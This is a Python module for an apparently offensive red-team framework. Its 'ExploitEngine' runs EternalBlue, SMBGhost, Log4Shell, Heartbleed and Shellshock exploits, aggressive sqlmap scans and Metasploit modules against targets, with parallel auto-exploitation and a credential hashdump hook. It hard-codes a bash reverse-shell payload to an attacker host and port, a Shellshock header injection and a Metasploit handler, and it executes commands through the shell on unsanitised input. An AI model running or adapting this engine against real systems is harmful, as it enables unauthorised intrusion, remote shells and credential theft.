"""
Professional Exploit Execution Module
Comprehensive exploit framework for red team operations
Integrates with Metasploit, Nuclei, and custom exploits
"""

import os
import subprocess
import threading
import time
import json
import re
from datetime import datetime
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

from cyberapp.models.db import db_conn
from cyberapp.models.credentials import CredentialStore
from cybermodules.hashdump import HashDumpEngine
from cybermodules.helpers import log_to_intel, log_security_finding

logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Exploit categorization types"""
    WEB_VULN = "web_vulnerability"
    LOCAL_PRIVESC = "local_privilege_escalation"
    REMOTE_CODE_EXEC = "remote_code_execution"
    AUTH_BYPASS = "authentication_bypass"
    INFORMATION_DISCLOSURE = "information_disclosure"
    DENIAL_OF_SERVICE = "denial_of_service"
    CUSTOM = "custom"


class ExploitStatus(Enum):
    """Exploit execution status"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"
    NO_EXPLOIT = "no_exploit_available"


class SeverityLevel(Enum):
    """CVSS-based severity levels"""
    CRITICAL = 9.0
    HIGH = 7.0
    MEDIUM = 4.0
    LOW = 0.1
    INFO = 0.0


@dataclass
class ExploitResult:
    """Result of exploit execution"""
    exploit_name: str
    target: str
    status: ExploitStatus
    severity: str
    output: str = ""
    shell_command: str = ""
    success: bool = False
    error: Optional[str] = None
    technique_id: str = ""
    remediation: str = ""
    execution_time: float = 0.0
    scan_id: int = 0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ExploitModule:
    """Exploit module definition"""
    name: str
    cve_id: Optional[str]
    exploit_type: ExploitType
    severity: SeverityLevel
    command_template: str
    description: str
    target_os: List[str] = field(default_factory=lambda: ["linux", "windows"])
    required_tools: List[str] = field(default_factory=list)
    technique_id: str = ""
    remediation: str = ""


class ExploitEngine:
    """
    Professional Exploit Execution Engine
    Supports multiple exploit frameworks and custom exploits
    """
    
    # Predefined exploit modules
    EXPLOIT_MODULES = [
        ExploitModule(
            name="SMB Ghost (CVE-2020-0796)",
            cve_id="CVE-2020-0796",
            exploit_type=ExploitType.REMOTE_CODE_EXEC,
            severity=SeverityLevel.CRITICAL,
            command_template="python3 /opt/exploits/CVE-2020-0796.py {target}",
            description="SMBv3 compression vulnerability allows RCE",
            target_os=["windows"],
            required_tools=["python3"],
            technique_id="T1210",
            remediation="Apply KB4551762 security update"
        ),
        ExploitModule(
            name="EternalBlue (MS17-010)",
            cve_id="MS17-010",
            exploit_type=ExploitType.REMOTE_CODE_EXEC,
            severity=SeverityLevel.CRITICAL,
            command_template="python3 /opt/exploits/eternalblue.py {target}",
            description="SMBv1 vulnerability affecting Windows systems",
            target_os=["windows"],
            required_tools=["python3", "impacket"],
            technique_id="T1190",
            remediation="Disable SMBv1, apply security patches"
        ),
        ExploitModule(
            name="Log4Shell (CVE-2021-44228)",
            cve_id="CVE-2021-44228",
            exploit_type=ExploitType.REMOTE_CODE_EXEC,
            severity=SeverityLevel.CRITICAL,
            command_template="python3 /opt/exploits/log4j.py {target} '{payload}'",
            description="Apache Log4j2 JNDI features used in configuration",
            target_os=["linux", "windows"],
            required_tools=["python3", "ldap"],
            technique_id="T1190",
            remediation="Upgrade Log4j to 2.17.0 or later"
        ),
        ExploitModule(
            name="Heartbleed (CVE-2014-0160)",
            cve_id="CVE-2014-0160",
            exploit_type=ExploitType.INFORMATION_DISCLOSURE,
            severity=SeverityLevel.HIGH,
            command_template="python3 /opt/exploits/heartbleed.py {target}",
            description="OpenSSL heartbeat memory disclosure",
            target_os=["linux"],
            required_tools=["python3"],
            technique_id="T1555",
            remediation="Upgrade OpenSSL to 1.0.1g or later"
        ),
        ExploitModule(
            name="Shellshock (CVE-2014-6271)",
            cve_id="CVE-2014-6271",
            exploit_type=ExploitType.REMOTE_CODE_EXEC,
            severity=SeverityLevel.HIGH,
            command_template="curl -H 'User-Agent: () {{ :; }}; echo {exploit}' {target}",
            description="Bash shell vulnerability via environment variables",
            target_os=["linux"],
            required_tools=["curl"],
            technique_id="T1190",
            remediation="Upgrade bash to latest version"
        ),
    ]
    
    def __init__(self, scan_id: int, config: Optional[Dict] = None):
        self.scan_id = scan_id
        self.config = config or {}
        self.results: List[ExploitResult] = []
        self.session_info = None
        self.verbose = self.config.get("verbose", False)
        self.timeout = self.config.get("timeout", 300)
        self.max_threads = self.config.get("max_threads", 5)
        self.auto_escalate = self.config.get("auto_escalate", True)
        
    def log(self, message: str, level: str = "INFO"):
        """Logging helper"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [ExploitEngine/{level}] {message}"
        print(log_msg)
        log_to_intel(self.scan_id, "EXPLOIT", log_msg)
        
    def set_session_info(self, session_info: Dict):
        """Set session information for post-exploitation"""
        self.session_info = session_info
        self.log(f"Session info set: {session_info.get('target', 'unknown')}")
        
    def _get_exploit_for_vuln(self, vuln_type: str, target: str) -> Optional[ExploitModule]:
        """Match vulnerability type to appropriate exploit module"""
        vuln_lower = vuln_type.lower()
        
        # Mapping vulnerability types to exploits
        vuln_exploit_map = {
            "sql": None,  # Use sqlmap
            "rce": ExploitModule(
                name="Custom RCE Exploit",
                cve_id=None,
                exploit_type=ExploitType.REMOTE_CODE_EXEC,
                severity=SeverityLevel.HIGH,
                command_template="python3 /opt/exploits/rce_exploit.py {target}",
                description="Custom remote code execution exploit",
                technique_id="T1190",
                remediation="Input validation and output encoding"
            ),
            "ssti": None,  # Use Nuclei template
            "deserialization": ExploitModule(
                name="Java Deserialization",
                cve_id=None,
                exploit_type=ExploitType.REMOTE_CODE_EXEC,
                severity=SeverityLevel.CRITICAL,
                command_template="java -jar /opt/exploits/deserialization.jar {target}",
                description="Java deserialization vulnerability",
                technique_id="T1190",
                remediation="Upgrade libraries, use safe deserialization"
            ),
            "file_upload": ExploitModule(
                name="Webshell Upload",
                cve_id=None,
                exploit_type=ExploitType.REMOTE_CODE_EXEC,
                severity=SeverityLevel.HIGH,
                command_template="msfconsole -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; run'",
                description="Unrestricted file upload leading to RCE",
                technique_id="T1190",
                remediation="File type validation, upload directory isolation"
            ),
        }
        
        for key, exploit in vuln_exploit_map.items():
            if key in vuln_lower:
                return exploit
                
        return None
    
    def execute_nuclei(self, target: str, template: str) -> ExploitResult:
        """Execute Nuclei for vulnerability exploitation"""
        cmd = f"nuclei -u {target} -t {template} -silent -timeout 30"
        
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return ExploitResult(
                exploit_name="Nuclei",
                target=target,
                status=ExploitStatus.SUCCESS if result.returncode == 0 else ExploitStatus.FAILED,
                severity="HIGH",
                output=result.stdout or result.stderr,
                shell_command=cmd,
                success=result.returncode == 0,
                technique_id="T1190"
            )
        except Exception as e:
            return ExploitResult(
                exploit_name="Nuclei",
                target=target,
                status=ExploitStatus.FAILED,
                severity="INFO",
                error=str(e),
                shell_command=cmd
            )
    
    def execute_sqlmap(self, target: str, param: str = "id") -> ExploitResult:
        """Execute SQLMap for SQL injection exploitation"""
        cmd = [
            "sqlmap",
            "-u", target,
            "--batch",
            "--risk=3",
            "--level=5",
            "--dbs",
            "--threads=4"
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Parse SQLMap output for databases
            databases = []
            if "available databases" in result.stdout.lower():
                databases = re.findall(r"\[\*\] (\w+)", result.stdout)
            
            return ExploitResult(
                exploit_name="SQLMap",
                target=target,
                status=ExploitStatus.SUCCESS,
                severity="CRITICAL",
                output=f"Databases found: {', '.join(databases)}",
                shell_command=" ".join(cmd),
                success=True,
                technique_id="T1190",
                remediation="Use parameterized queries, input validation"
            )
        except Exception as e:
            return ExploitResult(
                exploit_name="SQLMap",
                target=target,
                status=ExploitStatus.FAILED,
                severity="HIGH",
                error=str(e),
                shell_command=" ".join(cmd)
            )
    
    def execute_custom_exploit(self, exploit_module: ExploitModule, target: str, 
                               lhost: str = "", lport: int = 4444) -> ExploitResult:
        """Execute a custom exploit module"""
        start_time = time.time()
        
        # Build command with variables
        cmd_template = exploit_module.command_template
        cmd = cmd_template.format(
            target=target,
            lhost=lhost or self.session_info.get("lhost", "127.0.0.1") if self.session_info else "127.0.0.1",
            lport=lport or self.session_info.get("lport", 4444) if self.session_info else 4444,
            payload=f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        )
        
        self.log(f"Executing: {cmd}")
        
        try:
            # Check if exploit file exists
            if "python3" in cmd and "/opt/exploits/" in cmd:
                exploit_path = re.search(r"/opt/exploits/\S+", cmd)
                if exploit_path:
                    path = exploit_path.group()
                    if not os.path.exists(path):
                        return ExploitResult(
                            exploit_name=exploit_module.name,
                            target=target,
                            status=ExploitStatus.NO_EXPLOIT,
                            severity=exploit_module.severity.name,
                            error=f"Exploit file not found: {path}",
                            shell_command=cmd,
                            technique_id=exploit_module.technique_id,
                            remediation=exploit_module.remediation
                        )
            
            result = subprocess.run(
                cmd.split() if "curl" not in cmd else cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                shell=True
            )
            
            execution_time = time.time() - start_time
            
            # Check for success indicators
            success = (
                result.returncode == 0 or
                "exploitation successful" in result.stdout.lower() or
                "meterpreter" in result.stdout.lower() or
                "reverse shell" in result.stdout.lower()
            )
            
            return ExploitResult(
                exploit_name=exploit_module.name,
                target=target,
                status=ExploitStatus.SUCCESS if success else ExploitStatus.FAILED,
                severity=exploit_module.severity.name,
                output=result.stdout[:2000] + result.stderr[:500],
                shell_command=cmd,
                success=success,
                error=result.stderr if result.returncode != 0 else None,
                technique_id=exploit_module.technique_id,
                remediation=exploit_module.remediation,
                execution_time=execution_time,
                scan_id=self.scan_id
            )
            
        except subprocess.TimeoutExpired:
            return ExploitResult(
                exploit_name=exploit_module.name,
                target=target,
                status=ExploitStatus.FAILED,
                severity=exploit_module.severity.name,
                error="Exploit timed out",
                shell_command=cmd,
                execution_time=time.time() - start_time,
                technique_id=exploit_module.technique_id
            )
        except Exception as e:
            return ExploitResult(
                exploit_name=exploit_module.name,
                target=target,
                status=ExploitStatus.FAILED,
                severity=exploit_module.severity.name,
                error=str(e),
                shell_command=cmd,
                execution_time=time.time() - start_time,
                technique_id=exploit_module.technique_id
            )
    
    def exploit_vulnerability(self, vuln_type: str, target: str, 
                              vuln_data: Optional[Dict] = None) -> ExploitResult:
        """
        Main method to exploit a discovered vulnerability
        Automatically selects appropriate exploit method
        """
        self.log(f"Attempting exploitation of {vuln_type} on {target}")
        
        # Check for Metasploit exploit first
        if vuln_data and vuln_data.get("has_msf_module"):
            return self.execute_msf_exploit(vuln_data, target)
        
        # Try Nuclei for known CVEs
        cve_id = vuln_data.get("cve_id", "") if vuln_data else ""
        if cve_id:
            nuclei_template = f"/opt/nuclei-templates/cves/{cve_id.replace('-', '-')}.yaml"
            if os.path.exists(nuclei_template):
                return self.execute_nuclei(target, nuclei_template)
        
        # Try SQLMap for SQL injection
        if "sql" in vuln_type.lower():
            return self.execute_sqlmap(target)
        
        # Try custom exploit
        exploit_module = self._get_exploit_for_vuln(vuln_type, target)
        if exploit_module:
            return self.execute_custom_exploit(exploit_module, target)
        
        # No exploit available
        return ExploitResult(
            exploit_name="None",
            target=target,
            status=ExploitStatus.NO_EXPLOIT,
            severity=vuln_data.get("severity", "MEDIUM") if vuln_data else "MEDIUM",
            output="No matching exploit available",
            technique_id="T1190",
            remediation="Manual verification required"
        )
    
    def execute_msf_exploit(self, vuln_data: Dict, target: str) -> ExploitResult:
        """Execute Metasploit exploit if available"""
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            # Connect to Metasploit RPC
            client = MsfRpcClient(self.config.get("msf_password", "password"))
            
            # Use appropriate exploit module
            exploit_name = vuln_data.get("msf_module", "exploit/multi/handler")
            exploit = client.modules.use("exploit", exploit_name)
            
            # Set options
            exploit["RHOST"] = target
            if self.session_info:
                exploit["LHOST"] = self.session_info.get("lhost", "0.0.0.0")
                exploit["LPORT"] = self.session_info.get("lport", 4444)
            
            # Execute exploit
            result = exploit.execute()
            
            return ExploitResult(
                exploit_name=f"Metasploit - {exploit_name}",
                target=target,
                status=ExploitStatus.SUCCESS if result.get("success") else ExploitStatus.FAILED,
                severity="CRITICAL",
                output=str(result),
                success=result.get("success", False),
                technique_id="T1190"
            )
            
        except Exception as e:
            return ExploitResult(
                exploit_name="Metasploit",
                target=target,
                status=ExploitStatus.FAILED,
                severity="CRITICAL",
                error=f"Metasploit error: {str(e)}"
            )
    
    def auto_exploit_all(self, vulnerabilities: List[Dict], targets: List[str]) -> List[ExploitResult]:
        """
        Automatically attempt exploitation of all discovered vulnerabilities
        Uses threading for parallel execution
        """
        self.log(f"Starting auto-exploitation of {len(vulnerabilities)} vulnerabilities")
        results = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for vuln in vulnerabilities:
                vuln_type = vuln.get("type", "")
                target = vuln.get("target", "")
                
                if not target:
                    # Use first target from list
                    target = targets[0] if targets else "localhost"
                
                future = executor.submit(
                    self.exploit_vulnerability,
                    vuln_type,
                    target,
                    vuln
                )
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Log result
                    self.log(
                        f"Exploit result: {result.exploit_name} - {result.status.value} - "
                        f"Success: {result.success}"
                    )
                    
                    # Log security finding if successful
                    if result.success:
                        log_security_finding(
                            self.scan_id,
                            result.severity,
                            f"Exploit successful: {result.exploit_name} on {result.target}"
                        )
                        
                except Exception as e:
                    self.log(f"Exploit error: {str(e)}", "ERROR")
        
        self.results = results
        self.log(f"Auto-exploitation complete: {len(results)} results")
        return results
    
    def generate_exploit_report(self) -> Dict:
        """Generate comprehensive exploit execution report"""
        successful = [r for r in self.results if r.success]
        failed = [r for r in self.results if not r.success]
        no_exploit = [r for r in self.results if r.status == ExploitStatus.NO_EXPLOIT]
        
        return {
            "scan_id": self.scan_id,
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total_attempts": len(self.results),
                "successful": len(successful),
                "failed": len(failed),
                "no_exploit_available": len(no_exploit),
                "success_rate": round(len(successful) / max(len(self.results), 1) * 100, 2)
            },
            "successful_exploits": [
                {
                    "target": r.target,
                    "exploit": r.exploit_name,
                    "technique": r.technique_id,
                    "severity": r.severity,
                    "output": r.output[:500]
                }
                for r in successful
            ],
            "failed_exploits": [
                {
                    "target": r.target,
                    "exploit": r.exploit_name,
                    "error": r.error
                }
                for r in failed
            ],
            "recommendations": self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate remediation recommendations based on results"""
        recommendations = []
        
        successful_techniques = set(r.technique_id for r in self.results if r.success)
        
        if "T1190" in successful_techniques:
            recommendations.append("Critical: Application-side attacks detected. Implement WAF and input validation.")
        if "T1555" in successful_techniques:
            recommendations.append("High: Credentials accessed from memory. Enable credential guard.")
        if not self.results:
            recommendations.append("No exploits executed. Ensure proper reconnaissance first.")
            
        return recommendations
    
    def save_results(self):
        """Save exploit results to database"""
        try:
            with db_conn() as conn:
                for result in self.results:
                    conn.execute("""
                        INSERT INTO exploit_results 
                        (scan_id, target, exploit_name, status, severity, 
                         output, technique_id, remediation, execution_time)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """, (
                        self.scan_id,
                        result.target,
                        result.exploit_name,
                        result.status.value,
                        result.severity,
                        result.output[:2000],
                        result.technique_id,
                        result.remediation,
                        result.execution_time
                    ))
                conn.commit()
            self.log(f"Saved {len(self.results)} exploit results to database")
        except Exception as e:
            self.log(f"Failed to save results: {str(e)}", "ERROR")


# Session hook integration
def on_crack_session_opened(scan_id: int, session_info: Dict) -> Dict:
    """
    CrackSession açıldığında otomatik olarak çağrılır
    Session info örneği:
    {
        'target': '10.10.10.100',
        'username': 'administrator',
        'password': 'AdminPass123!',
        'domain': 'CORP',
        'protocol': 'smb',
        'session_type': 'psexec/mimikatz/exec'
    }
    """
    engine = ExploitEngine(scan_id)
    engine.set_session_info(session_info)
    
    result = {
        "exploit_engine": "initialized",
        "session_target": session_info.get("target"),
        "status": "ready"
    }
    
    return result


def trigger_hashdump_after_session(scan_id: int, target: str, username: str, 
                                   password: str, domain: str = "") -> Dict:
    """
    Manuel olarak hashdump workflow başlat
    """
    session_info = {
        "target": target,
        "username": username,
        "password": password,
        "domain": domain
    }
    
    hash_engine = HashDumpEngine(scan_id, session_info)
    return hash_engine.execute_session_hook()